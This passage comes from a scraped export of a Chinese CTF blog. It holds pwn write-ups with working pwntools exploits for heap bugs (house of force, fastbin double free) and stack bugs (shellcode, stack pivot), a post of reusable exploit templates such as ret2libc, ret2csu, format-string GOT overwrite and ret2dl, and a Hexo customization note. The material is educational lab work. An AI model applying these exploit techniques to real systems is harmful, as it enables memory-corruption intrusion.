0x76F000log.success(&quot;libc_base:&quot; + hex(libc_base))malloc_hook_addr = libc_base + libc.symbols[&quot;__malloc_hook&quot;] ​ 接着就是修改top chunk的指针，这里主要涉及到hof的知识点，需要注意的就是offset的计算。 1234567891011121314151617#leak top chunk addrp.recvuntil(&quot;2:puts\\n&quot;)p.sendline(&quot;1&quot;)p.recvuntil(&quot;size&quot;)p.sendline(&#x27;4&#x27;)p.recvuntil(&quot;bin addr &quot;)top_chunk_addr = u64(p.recv(8)) - 0x20log.info(&quot;top_chunk_addr :&quot;.format(hex(top_chunk_addr)))#modify top chunk addrp.sendafter(&quot;content&quot;,b&#x27;a&#x27;*0x10 + p64(0xffffffffffffffff)*2)#modify top chunk ptrfake_size = malloc_hook_addr - top_chunk_addr - 0x10#0x2AAAA27CA9C0add(fake_size,b&#x27;a&#x27;)#modify malloc hook space with onegadgetadd(0x10,p64(libc_base + one_gadget))add(0x10,b&#x27;a&#x27;)p.interactive() ​ ​","categories":[{"name":"HEAP - House Of Force","slug":"HEAP-House-Of-Force","permalink":"https://fuurinko.github.io/categories/HEAP-House-Of-Force/"}],"tags":[{"name":"hof","slug":"hof","permalink":"https://fuurinko.github.io/tags/hof/"}]},{"title":"9447_CTF-Search Engine","slug":"week5-2.1","date":"2022-03-29T02:44:17.477Z","updated":"2022-04-11T15:16:40.759Z","comments":true,"path":"2022/03/29/week5-2.1/","link":"","permalink":"https://fuurinko.github.io/2022/03/29/week5-2.1/","excerpt":"","text":"overview 逆向menu​ 一共只有两个功能，search word和index sentence。 index sentence​ 指针操作有点多，配合gdb观看效果更佳。 ​ 当只malloc一个10 size的chunk时，内存是这样的，代码是这样的： 123456789101112131415161718puts(&quot;Enter the sentence size:&quot;); v0 = read_num(); sentence_size = (unsigned int)(v0 - 1); size = v0; if ( (unsigned int)sentence_size &gt; 0xFFFD ) error(&quot;Invalid size&quot;); puts(&quot;Enter the sentence:&quot;); sentence_ptr = (char *)malloc(size);//一个content chunk read_word((__int64)sentence_ptr, size, 0); v4 = sentence_ptr + 1; v5 = (__int64)&amp;sentence_ptr[sentence_size + 2]; ptr2 = malloc(0x28uLL);//一个ptr chunk v7 = 0; *(_QWORD *)ptr2 = sentence_ptr; ptr2[2] = 0; *((_QWORD *)ptr2 + 2) = sentence_ptr; ptr2[6] = size; search1234567891011121314151617181920212223242526if ( item ) &#123; do &#123; if ( *(_BYTE *)head-&gt;sentence_ptr ) &#123; if ( head-&gt;size == size &amp;&amp; !memcmp((const void *)head-&gt;content, ptr, size) ) &#123; __printf_chk(1LL, &quot;Found %d: &quot;, (unsigned int)head-&gt;word_size); fwrite((const void *)head-&gt;sentence_ptr, 1uLL, head-&gt;word_size, stdout); putchar(10); puts(&quot;Delete this sentence (y/n)?&quot;); read_word((__int64)v3, 2, 1); if ( v3[0] == &#x27;y&#x27; ) &#123; memset((void *)head-&gt;sentence_ptr, 0, head-&gt;word_size); free((void *)head-&gt;sentence_ptr); puts(&quot;Deleted!&quot;); &#125; &#125; &#125; head = (word *)head-&gt;next; &#125; while ( head ); &#125; free(ptr); 这个功能相当于一个add加一个free，如果search到了word就可以删除chunk。注意一定是word和size完全匹配才能成功搜索： 漏洞点read_str1234567891011121314151617181920212223242526272829303132if ( size &lt;= 0 ) &#123; v4 = 0; &#125; else &#123; v4 = 0; while ( 1 ) &#123; v5 = (_BYTE *)(head + v4); v6 = fread(v5, 1uLL, 1uLL, stdin); // read one byte from stdin to &amp;v5 if ( v6 &lt;= 0 ) break; if ( *v5 == &#x27;\\n&#x27; &amp;&amp; value_0 ) &#123; if ( v4 ) &#123; *v5 = 0; return; &#125; v4 = v6 - 1; if ( size &lt;= v6 - 1 ) break; &#125; else &#123; v4 += v6; if ( size &lt;= v4 ) break; &#125; &#125; &#125; ​ 在读取的时候，if读入的终止判断为if ( *v5 == &#39;\\n&#39; &amp;&amp; value_0 )，value_0为传入的参数，恒为0，因此这个0后面的条件语句就不管用了，直接跳转到else的情况，也就是一直读入size大小的字符为止，所以在执行程序的时候回车无法结束输入，同时输入的字符串在内存中也没有空字节作为结尾。 ​ 既然又是没有空字节，那么又可以考虑内存泄露的问题了。 delete123456if ( v3[0] == &#x27;y&#x27; ) &#123; memset((void *)head-&gt;sentence_ptr, 0, head-&gt;word_size); free((void *)head-&gt;sentence_ptr); puts(&quot;Deleted!&quot;); &#125; ​ 这里在free的时候把head-&gt;sentence_ptr置0了,并且由于对于单词的索引实际上是sentence ptr的引用，所以单词实际上也被置0了，然而指向单词的结构体指针，并没有被置0，因此能继续进行单词的搜索,只不过此刻单词需要搜索的内容为‘\\x00’。 ​ 利用利用unsortedbin leak libc，获取malloc hook12345678910sentence = b&#x27;a&#x27;*0x80 + b&#x27;bbbb bbbb bbbb b&#x27;index_sentence(len(sentence),sentence)#small binsearch_word(1,&quot;b&quot;) delete()gdb.attach(p)search_word(1,&#x27;\\x00&#x27;)p.recvuntil(&#x27;Found&#x27; + str(len(sentence)) + &#x27;: &#x27;)unsorted_bin_addr = u64(p.recv(8))p.recvuntil(&quot;Delete this sentence (y/n)?&quot;)p.sendline(&#x27;n&#x27;) ​ 先让一个small chunk进入unsorted bin，从gdb中我们可以看到其与main_arena的相对偏移，但是我们需要利用漏洞将其leak出来才能够利用。 ​ ​ 因为之前说到，就算delete了sentence，word chunk中的指针并没有被置0，还是能够搜索，所以只需要搜索\\x00，就能输出unsortedbin的地址。 构造double free，将fake chunk分配至malloc hook绕过验证，构造fastbin循环链表​ 虽然单词的指针并没有被置0，但是想要进行搜索还是需要绕过 if ( *(_BYTE *)head-&gt;sentence_ptr )的验证。 ​ 所以可以按照一般构造fastbin double free的思路来处理这里的chunk。 ​ 因为我们想要修改malloc hook，所以至少需要一个fd指向malloc hook的fake chunk和一个内容为one gadget的fake chunk，同时两个chunk都需要被分配在同一个ptr上，所以这里至少要构造出a-&gt;b-&gt;a-&gt;... ​ ​ 所以实现的过程大概是申请三个chunk，再依次删除： 1234567index_sentence(0x60,b&#x27;m&#x27;*0x5f+ b&#x27;a&#x27;)#aindex_sentence(0x60,b&#x27;m&#x27;*0x5f+ b&#x27;a&#x27;)#bindex_sentence(0x60,b&#x27;m&#x27;*0x5f+ b&#x27;a&#x27;)#csearch_word(1,b&#x27;a&#x27;)delete()delete()delete() ​ 这样fastbin链表如下： 1fastbin -&gt; a -&gt;b -&gt;c -&gt; NULL ​ 接着利用漏洞点，搜索空字节，double free b和a 123456search_word(&#x27;\\x00&#x27;)delete()#delete adelete()#delete bp.recvuntil(&quot;Delete this sentence (y/n)?&quot;)p.sendline(&#x27;n&#x27;)#fastbin =&gt;b -&gt;a -&gt; b -&gt; a -&gt; c -&gt; null ​ 这样再申请一个chunk，就能覆盖此刻b chunk的fd，将其修改为malloc hook。 12345678910111213index_sentence(0x60,content)#modify the fd ptrindex_sentence(0x60,b&#x27;a&#x27; * 0x60)#point to malloc hookindex_sentence(0x60,b&#x27;a&#x27; * 0x60)#chunk aone_gadget_addr = libc_base + 0x3f3d6payload = b&#x27;a&#x27; * 0x13 + p64(one_gadget_addr)#add to chunk b space againpayload = payload.ljust(0x60, b&#x27;q&#x27;)index_sentence(payload)p.interactive()","categories":[{"name":"HEAP - Fastbin Attack","slug":"HEAP-Fastbin-Attack","permalink":"https://fuurinko.github.io/categories/HEAP-Fastbin-Attack/"}],"tags":[{"name":"UAF","slug":"UAF","permalink":"https://fuurinko.github.io/tags/UAF/"}]},{"title":"ret2shellcode","slug":"stack_ret2shellcode","date":"2022-03-28T14:52:39.514Z","updated":"2022-10-18T05:49:45.440Z","comments":true,"path":"2022/03/28/stack_ret2shellcode/","link":"","permalink":"https://fuurinko.github.io/2022/03/28/stack_ret2shellcode/","excerpt":"","text":"​ 一个写shellcode大合集。 [极客大挑战 2019]Not Bad普通的栈迁移​ 无保护。可以读入程序的字符长度为0x38，读入shellcode的话空间会不够，需要栈迁移。 ​ ​ 程序为我们开辟了一块fake stack，我们可以直接将ebp劫持至0x123000。 ​ 关于栈迁移的部分，其实挺久没有利用到这个trick了，有些不记得了，但是看了相关的文章就又想起来了。这篇写得很详细：PWN！栈迁移原理 12payload = b&#x27;a&#x27;*32 + p64(target_addr) + p64(main_retn)#pivot the stack to target addr ​ 发送这一段payload以后rbp已经劫持到了0x123000。其实就是在第一次控制程序执行流的时候覆盖rbp为对应的地址，然后在跳转时回到了main函数，但跳过了对栈指针有操作的指令。 ​ 123456payload = asm(shellcraft.amd64.read(0,target_addr+0x300,0x300))#read shellcode to target addrpayload += asm(&quot;mov rax,0x123300;call rax&quot;)#执行shellcodepayload = payload.ljust(40,b&#x27;a&#x27;) payload += p64(target_addr)#控制程序执行流p.recvline(&quot;Easy shellcode, have fun!&quot;)p.sendline(payload) 123456shellcode = shellcraft.open(&quot;/flag&quot;) shellcode += shellcraft.read(3, target_addr + 0x100 , 0x50)shellcode += shellcraft.write(1, target_addr + 0x100, 0x50)shellcode = asm(shellcode)p.sendline(shellcode)p.interactive() 一开始shellcode怎么都生成不了，直到加了这个,挺无语的。 1context.arch = &#x27;amd64&#x27; 这个题还有另外一个比较逆天的思路。 逆天的栈迁移直接利用jmp rsp这个gadget，直接跳转到对应的地方执行，程序输入的buf是在rsp-0x30的地方，所以提前在buf布置好代码，然后利用jmp rsp执行。布置的代码就类似上一个比较常规的思路，套一个target addr 的read，然后读orw的shellcode。 12345678910111213141516171819202122232425from pwn import*#from LibcSearcher import LibcSearchercontext.arch = &#x27;amd64&#x27;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process(&quot;./bad&quot;)elf = ELF(&quot;./bad&quot;)jmp_rsp = 0x400a01target_addr = 0x123000payload = asm(shellcraft.read(0,target_addr + 0x300,0x300))+ asm(&quot;mov rax,0x123000;call rax&quot;)payload = payload.ljust(40,b&#x27;a&#x27;)payload += p64(jmp_rsp) + asm(&quot;sub 0x30,rsp;jmp rsp&quot;)p.recvline(&quot;Easy shellcode, have fun!&quot;)p.sendline(payload)shellcode = shellcraft.open(&quot;/flag&quot;) shellcode += shellcraft.read(3, target_addr + 0x100 , 0x20)shellcode += shellcraft.write(1, target_addr + 0x100, 0x20)shellcode = asm(shellcode)p.send(shellcode) mrctf2020_shellcode_revengeoverview 看起来像ret2shellcode。 逆向​ 不知道为什么ida不能一键f5，不过也懒得修了，程序逻辑也比较简单，就是一个write和read。然后程序会对输入的字符进行ascii码的大小的比较， ​ ​ 分析一下这个流程图，我们的目的是执行loc_1236，一共有三个箭头指向它，归纳以后分别是(0x60,0x7A),(0x2f,0x5A),ascii在这些范围内的字符会被读入buf，然后call rax，也就是执行了我们输入的shellcode。 利用​ 由于题目本身的设置，我们并不需要像常规那样先泄露什么栈上的地址，只需要绕过题目的检测。虽然但是，搞不懂这个字符ackii码的限制意义何在。去摸了一下ackii表，发现这个范围内的字符都是数字或者字母。 ​ 所以把shellcode转换成这些范围内的字符，然后直接传输就行。 ​","categories":[{"name":"STACK - ret2shellcode","slug":"STACK-ret2shellcode","permalink":"https://fuurinko.github.io/categories/STACK-ret2shellcode/"}],"tags":[{"name":"stack","slug":"stack","permalink":"https://fuurinko.github.io/tags/stack/"}]},{"title":"hexo调教合集","slug":"mess_hexo调教合集","date":"2022-03-26T04:12:52.291Z","updated":"2022-10-24T12:46:40.970Z","comments":true,"path":"2022/03/26/mess_hexo调教合集/","link":"","permalink":"https://fuurinko.github.io/2022/03/26/mess_hexo%E8%B0%83%E6%95%99%E5%90%88%E9%9B%86/","excerpt":"","text":"​ 如何实现一个好看且满足我所有需求的blog？ 高亮​ 之前我以为是博客主题配置的问题（就是highlight对象的值的问题），但是无论用怎么样的方法都不太行。 ​ 在研究代码高亮的过程中，我才知道原来有个项目叫highlight.js,里面有各种各样的代码高亮的css文件。 ​ 一开始我是将博客原本的代码高亮的css文件替换成我想要的样式，但是无论替换成什么样式，博客中代码都是蓝色，清一色的蓝色。然后我意识到，这根本不是什么代码高亮的样式，这根本就是，没有代码高亮。 ​ 然后我开始在网上寻找解决方案，搜索的关键词是hexo 无法显示代码高亮，辗转来回，找到了一篇文章。 ​ hexo中highlight.js代码高亮的修改方法 ​ 按照文章中的方法，我在主题layout文件夹中的_post.ejs文件随便找了个角落，把 12345678COPY&lt;!-- Highlight.js --&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;//highlightjs.org/static/demo/styles/night-owl.css&quot;&gt;&lt;script src=&quot;//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; hljs.initHighlightingOnLoad();&lt;/script 丢了进去。 ​ 然后我的博客就成功的显示了代码高亮。 ​ 高亮的样式可以通过更改sytels/xx来实现，具体的样式可以从Highlight.js官网找到。 音乐播放器​ 步骤其实比较简单。 1:安装插件​ ``` 1npm install --save hexo-tag-aplayer 2:更改配置​ 在hexo主题的config文件中增加 12aplayer: meting: true 3:在正文中添加tag例子 1&#123;% meting &quot;7342554262&quot; &quot;netease&quot; &quot;playlist&quot; &quot;theme:#555&quot; &quot;mutex:true&quot; &quot;listmaxheight:340px&quot; &quot;preload:auto&quot; %&#125; 选项 默认值 描述 id 必须值 歌曲 id / 播放列表 id / 相册 id / 搜索关键字 server 必须值 音乐平台: netease, tencent, kugou, xiami, baidu type 必须值 song, playlist, album, search, artist fixed false 开启固定模式 mini false 开启迷你模式 loop all 列表循环模式：all, one,none order list 列表播放模式： list, random volume 0.7 播放器音量 lrctype 0 歌词格式类型 listfolded false 指定音乐播放列表是否折叠 storagename metingjs LocalStorage 中存储播放器设定的键名 autoplay true 自动播放，移动端浏览器暂时不支持此功能 mutex true 该选项开启时，如果同页面有其他 aplayer 播放，该播放器会暂停 listmaxheight 340px 播放列表的最大长度 preload auto 音乐文件预载入模式，可选项： none, metadata, auto theme #ad7a86 播放器风格色彩设置 一些报错","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"bcloud","slug":"heap_hof_bcloud","date":"2022-03-25T12:33:06.204Z","updated":"2022-04-09T08:30:09.980Z","comments":true,"path":"2022/03/25/heap_hof_bcloud/","link":"","permalink":"https://fuurinko.github.io/2022/03/25/heap_hof_bcloud/","excerpt":"","text":"overview​ partial relro，可以改got表，也可以劫持hook。 REinit1234567memset(s, 0, 0x50u); puts(&quot;Input your name:&quot;); my_read((int)s, 64, 10); v2 = (char *)malloc(0x40u); dword_804B0CC = (int)v2; strcpy(v2, s); // name is stored in heap welcome(v2); add12345678910111213141516for ( i = 0; i &lt;= 9 &amp;&amp; content_chunk[i]; ++i ) ; if ( i == 10 ) return puts(&quot;Lack of space. Upgrade your account with just $100 :)&quot;); puts(&quot;Input the length of the note content:&quot;); v2 = read_num(); content_chunk[i] = (int)malloc(v2 + 4); if ( !content_chunk[i] ) exit(-1); size_chunk[i] = v2; puts(&quot;Input the content:&quot;); my_read(content_chunk[i], v2, 10); printf(&quot;Create success, the id is %d\\n&quot;, i); result = i; sync_chunk[i] = 0; return result; edit123456789101112puts(&quot;Input the id:&quot;); num = read_num(); if ( num &lt; 0 || num &gt; 9 ) return puts(&quot;Invalid ID.&quot;); v2 = content_chunk[num]; if ( !v2 ) return puts(&quot;Note has been deleted.&quot;); v3 = size_chunk[num]; sync_chunk[i] = 0; puts(&quot;Input the new content:&quot;); my_read(v2, v3, 10); return puts(&quot;Edit success.&quot;); ​ free1234567891011puts(&quot;Input the id:&quot;);num = read_num();if ( num &lt; 0 || num &gt; 9 ) return puts(&quot;Invalid ID.&quot;);ptr = (void *)content_chunk[num];if ( !ptr ) return puts(&quot;Note has been deleted.&quot;);content_chunk[num] = 0;size_chunk[num] = 0;free(ptr);return puts(&quot;Delete success.&quot;); sync1234puts(&quot;Syncing...&quot;);for ( i = 0; i &lt;= 9; ++i ) sub_8048BF5(i);return puts(&quot;Synchronization success.&quot;); 在content chunk中储存了目前已经allocated的chunk的ptr。size chunk储存了chunk的size，sync记录了chunk的上传成功与否。 ​ 可以看到，如果只add一个0x4大小的note，三个记录的chunk的状态如上。 利用确定思路​ 目前先考虑更改got表的做法，劫持hook相对来说更加麻烦，反正都要leak libc。 ​ ps：在调试的时候发现如果是利LD_PRELOAD进行其他版本的libc加载的话，会使libc地址低于heap段，其实影响有限，原因也很好理解，但用关于LD_PRELOAD对于内存空间加载的影响的问题可能后面会写一篇笔记来专门研究。 malloc_hook ​ 程序在开始会申请很多乱七八糟的东西，不太好看。但是核心是先要改top chunk的size为-1,或者说0xffffffff，这里需要一些绕过，之后就相对常规。整体看来除了没有控制size以外似乎没有可以利用的漏洞了。 此外或许可以更改ptr_chunk中top chunk的指针（不过这样似乎就不是hof了）。 ​ 发现一些非常怪异的点，如果用Ld_preload加载自己的libc，那么topchunk和malloc hook的偏移也会改变，并且直接由低地址变为了高地址。需要更改的地址也更小，四舍五入更简单。 漏洞点​ 看了很久，发现一个遗漏的点，在于init() 中，将s copy到v2中，是利用strcpy，这个之前在pwncollege中就被坑过，是一个人尽皆知的trick，利用覆盖空字节进行内存泄露。 ​ 利用这个strcpy我们一共可以找到两个漏洞，第一个是print name的时候对于堆基址的泄露，另外一个是在填org和host的时候覆盖top chunk size为0xffffffff。 ​ 覆盖size为0xffffffff后就相当于一个任意地址写了，为了leak libc，比较常规的思路是覆盖free got为puts got，以此打印atoi got来leak。leak之后利用edit来改atoi got为system从而getshell。 泄露堆指针12345p.recvuntil(&quot;Input your name:\\n&quot;)p.sendline(b&#x27;a&#x27;*64)p.recvuntil(b&#x27;Hey&#x27;)heap_base = u32(p.recv()[65:69])log.success(&#x27;heap_base: &#x27; + hex(heap_base)) ​ 我不理解，这个东西为什么还能有成功率。 修改top chunk size123offset = heap_base - malloc_hook_addr - 0xd0 + 0x8add(offset,b&#x27;a&#x27;)#chunk0,change top chunk ptr 覆盖free got, leak libc base12345678910payload = p32(4)*32payload += p32(free_got_addr)#chunk1payload += p32(atoi_got_addr)#chunk2payload += p32(atoi_got_addr)#chunk3edit(1,p32(printf_plt_addr))#modify the free to printffree(2)#print atoi_addratoi_addr = u32(p.recv(4))libc_base = atoi_addr - libc.symbols[&#x27;atoi&#x27;]system_addr = libc_base + libc.symbols[&#x27;system&#x27;] getshell1234edit(3,p32(system_addr))add(10,b&#x27;/bin/sh\\x00&#x27;)","categories":[{"name":"HEAP - House Of Force","slug":"HEAP-House-Of-Force","permalink":"https://fuurinko.github.io/categories/HEAP-House-Of-Force/"}],"tags":[{"name":"heap","slug":"heap","permalink":"https://fuurinko.github.io/tags/heap/"}]},{"title":"hitcon_training11","slug":"heap_hof_hitcontraininf11","date":"2022-03-24T14:16:18.934Z","updated":"2022-04-09T08:30:16.727Z","comments":true,"path":"2022/03/24/heap_hof_hitcontraininf11/","link":"","permalink":"https://fuurinko.github.io/2022/03/24/heap_hof_hitcontraininf11/","excerpt":"","text":"% meting “7342554262” “netease” “playlist” “theme:#555” “mutex:true” “listmaxheight:340px” “preload:auto” %} re​ 含有后门函数，直接的想法是利用hof将chunk分配至某个可写的位置，然后覆盖为后门。 1234v4 = malloc(0x10uLL); *v4 = hello_message; v4[1] = goodbye_message; (*v4)(); 123case 5: v4[1](); exit(0); ​ 观察到程序首先allocate了一个0x10 size的chunk来保存一个问候和再见的消息的指针，并且在程序结束的时候会对其进行调用，所以我们只要将告别的指针覆盖为magic()就能getshell。也就是将0x603268覆盖为0x400D49。 利用更改top chunk size​ 由于程序直接给了无size限制的edit功能，所以只需要利用edit将top chunk的size以及pre size修改就可。 123add(48,b&#x27;aaaa&#x27;)gdb.attach(r)edit(0,64,b&#x27;a&#x27;*56+p64(0xffffffffffffffff)) ​ 申请target addr​ 这样就大致将top chunk的size修改为一个非常大的size了，以供我们申请任意size的chunk，实现将topchunk ptr指向target addr的效果。 ​ 回想一下，现在top chunk的ptr是。。。为什么有随机化啊。 ​ （随机化的小插曲大概是由于整个ubuntu的环境并没有禁用aslr）现在需要让top chunk ptr由32b0指向3268。 123malloc_size = -0x69#-（0x30+0x20+0x8+0xf+0x2)add(malloc_size,b&#x27;aaa&#x27;)add(0x10,p64(magic)*2) ​ ​ 可以看到top chunk已经指向0x603250了，所以这时候只需要add 0x10的chunk覆盖指针，就行。 ​ exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *libc = ELF(&quot;/glibc/2.23/64/lib/libc-2.23.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;goodbye_addr = 0x603268magic = 0x400D49#ar = process([&quot;/glibc/2.23/64/lib/ld-2.23.so&quot;,&quot;./bamboobox&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;/glibc/2.23/64/lib/libc.so.6&quot;&#125;)#r = process(&quot;./bamboobox&quot;)def add(size, name): r.recvuntil(&quot;:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(size)) r.recvuntil(&quot;:&quot;) r.sendline(name)def edit(idx, size, name): r.recvuntil(&quot;:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx)) r.recvuntil(&quot;:&quot;) r.sendline(str(size)) r.recvuntil(&quot;:&quot;) r.sendline(name)def free(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;4&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))def show(): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;)add(48,b&#x27;aaaa&#x27;)edit(0,64,b&#x27;a&#x27;*56+p64(0xffffffffffffffff))malloc_size = -0x69add(malloc_size,b&#x27;aaa&#x27;)add(0x10,p64(magic)*2)r.recvuntil(&quot;:&quot;)r.sendline(&quot;5&quot;)r.interactive()","categories":[{"name":"HEAP - House Of Force","slug":"HEAP-House-Of-Force","permalink":"https://fuurinko.github.io/categories/HEAP-House-Of-Force/"}],"tags":[{"name":"heap","slug":"heap","permalink":"https://fuurinko.github.io/tags/heap/"}]},{"title":"一些板子","slug":"sum_一些板子","date":"2022-03-21T08:45:02.536Z","updated":"2022-04-09T08:38:11.098Z","comments":true,"path":"2022/03/21/sum_一些板子/","link":"","permalink":"https://fuurinko.github.io/2022/03/21/sum_%E4%B8%80%E4%BA%9B%E6%9D%BF%E5%AD%90/","excerpt":"","text":"stackret2shellcode123456789101112from pwn import*from LibcSearcher import LibcSearchercontext.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process(&quot;./&quot;)elf = ELF(&quot;./&quot;)shellcode = shellcraft.amd64.open(&quot;/flag&quot;) shellcode += shellcraft.amd64.read(&#x27;rax&#x27;, &#x27;rsp&#x27;, 0x20)shellcode += shellcraft.amd64.write(1, &#x27;rsp&#x27;, 0x20)shellcode = asm(shellcraft.amd64.sh()) ret2libc1234567891011121314151617181920212223242526272829303132333435363738from pwn import*from LibcSearcher import LibcSearchercontext.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process(&quot;./&quot;)elf = ELF(&quot;./&quot;)0ffset = puts_plt = elf.plt[&#x27;puts&#x27;]libc_start_main_got = elf.got[&#x27;__libc_start_main&#x27;]main = elf.symbols[&#x27;main&#x27;]payload = b&#x27;a&#x27;* offset + p64(puts_plt) + p64(main) + p64(libc_start_main_got)p.recvline()p.sendlineafter(b&#x27;?&#x27;,payload)libc_start_main_addr = u64(p.recv()[0:8])print(p64(libc_start_main_addr))libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)payload = b&#x27;a&#x27;* offset + p64(system_addr) + p64(0xdeadbeef) + p64(binsh_addr)p.sendline(payload)p.interactive() ret2csu12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import*from LibcSearcher import LibcSearchercontext.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;#libc = ELF(&quot;&quot;)elf = ELF(&quot;./level3_x64&quot;)p = process(&quot;./level3_x64&quot;)0ffset = csu_front_addr = 0x400690csu_end_addr = 0x4006AAputs_plt = elf.plt[&#x27;puts&#x27;]libc_start_main_got = elf.got[&#x27;__libc_start_main&#x27;]main = elf.symbols[&#x27;main&#x27;]write_got = elf.got[&#x27;write&#x27;]read_got = elf.got[&#x27;read&#x27;]main_addr = elf.symbols[&#x27;main&#x27;]def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = b&#x27;a&#x27; * offset payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += &#x27;a&#x27; * (offset - 0x48) payload += p64(last) p.send(payload) sleep(1)csu(0, 1, write_got, 8, write_got, 1, main_addr)write_addr = u64(p.recv(8))libc = LibcSearcher(&#x27;write&#x27;, write_addr)libc_base = write_addr - libc.dump(&#x27;write&#x27;)execve_addr = libc_base + libc.dump(&#x27;execve&#x27;)log.success(&#x27;execve_addr &#x27; + hex(execve_addr))&#x27;&#x27;&#x27;libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)log.success(&#x27;system_addr &#x27; + hex(system_addr))&#x27;&#x27;&#x27;csu(0, 1, read_got, 16, bss_base, 0, main_addr)p.send(p64(execve_addr) + &#x27;/bin/sh\\x00&#x27;)p.recvuntil(&#x27;Hello, World\\n&#x27;)## execve(bss_base+8)csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)p.sendline(payload)p.interactive() DynELF123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *# context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./bof&#x27;)p = process(&#x27;./bof&#x27;)p.recvline()offset = 112write_plt = elf.plt[&#x27;write&#x27;]write_got = elf.got[&#x27;write&#x27;]read_plt = elf.plt[&#x27;read&#x27;]read_got = elf.got[&#x27;read&#x27;]start_addr = 0x080483d0bss_addr = 0x0804a020pppr_addr = 0x0804856cret_addr = 0x08048484def leak(addr): payload = b&#x27;a&#x27;*offset payload += p32(write_plt) payload += p32(ret_addr) payload += p32(1) payload += p32(addr) payload += p32(4) p.send(payload) data = p.recv() log.info(&quot;leaking: 0x%x --&gt; %s&quot; % (addr, (data or &#x27;&#x27;).encode(&#x27;hex&#x27;))) return datad = DynELF(leak,elf = elf)system_addr = d.lookup(&#x27;system&#x27;,&#x27;libc&#x27;)log.info(&quot;system address: 0x%x&quot; % system_addr)#ret2vulnpayload = b&#x27;a&#x27;*offsetpayload += p32(read_plt)payload += p32(pppr_addr)payload += p32(0)payload += p32(bss_addr)payload += p32(8)payload += p32(system_addr)payload += p32(ret_addr)payload += p32(bss_addr)p.send(payload)p.send(&#x27;/bin/sh\\x00&#x27;)p.interactive() FMT（利用pwntools的fmt module实现自动化修改got） 32bit1234567891011121314151617181920212223242526272829303132333435from pwn import *elf = ELF(&#x27;./&#x27;)r = process(&#x27;./&#x27;)libc = ELF(&#x27;/&#x27;)# 计算偏移量def exec_fmt(payload): r.sendline(payload) info = r.recv() return info auto = FmtStr(exec_fmt)offset = auto.offset# 获得 func 的 got 地址func_got = elf.got[&#x27;func&#x27;]#func通常是一些例如printf或puts的函数log.success(&quot;func_got =&gt; &#123;&#125;&quot;.format(hex(func_got)))# 获得 func 的真实地址payload = p32(func_got) + &#x27;%&#123;&#125;$s&#x27;.format(offset)r.send(payload)func_addr = u32(r.recv()[4:8])log.success(&quot;func_addr =&gt; &#123;&#125;&quot;.format(hex(func_addr)))# 获得 system 的真实地址system_addr = func_addr - (libc.symbols[&#x27;func&#x27;] - libc.symbols[&#x27;system&#x27;])log.success(&quot;system_addr =&gt; &#123;&#125;&quot;.format(hex(system_addr)))payload = fmtstr_payload(offset, &#123;func_got : system_addr&#125;)r.send(payload)r.send(&#x27;/bin/sh&#x27;)r.recv()r.interactive() ret2dl12345678910111213141516171819202122232425262728293031323334353637383940414243from roputils import *from pwn import processfrom pwn import gdbfrom pwn import contextlibc = ELF(&quot;/glibc/2.23/64/lib/libc-2.23.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;r = process(&#x27;./baby_pwn&#x27;)r.recv()rop = ROP(&#x27;./baby_pwn&#x27;)offset = 44bss_base = rop.section(&#x27;.bss&#x27;)buf = rop.fill(offset)buf += rop.call(&#x27;read&#x27;, 0, bss_base, 100)## used to call dl_runtimeresolve()buf += rop.dl_resolve_call(bss_base + 20, bss_base)r.send(buf)buf = rop.string(&#x27;/bin/sh&#x27;)buf += rop.fill(20, buf)## used to make faking data, such relocation, Symbol, Strbuf += rop.dl_resolve_data(bss_base + 20, &#x27;system&#x27;)buf += rop.fill(100, buf)r.send(buf)r.interactive()-------------------------------------------------------------------------------from pwn import *context.binary = elf = ELF(&quot;./baby_pwn&quot;)rop = ROP(context.binary)dlresolve = 